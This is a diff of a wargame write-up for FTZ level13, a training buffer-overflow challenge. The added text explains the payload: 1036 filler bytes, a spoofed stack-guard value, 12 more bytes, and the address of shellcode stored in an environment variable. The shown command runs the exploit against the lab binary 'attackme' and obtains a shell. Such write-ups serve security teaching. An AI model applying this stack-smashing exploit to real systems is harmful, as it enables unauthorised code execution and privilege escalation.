@@ -225,9 +225,11 @@ main() {
 EGG : 0xbffffc8e
 ```
 
-I made the env variable of EGG(shell code) and then made getegg(to get EGG's address)
+I made the env variable of EGG(shell code) and then made getegg(to get EGG's address).
 
-```
+And I will exploit 1036bytes dummy string + stackguard(\x67\x45\x23\x01) + 12bytes dummy string + the egg's adress(0xbffffc8e)
+
+``` 
 [level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x8e\xfc\xff\xbf"'`
 
 sh-2.05b$ id
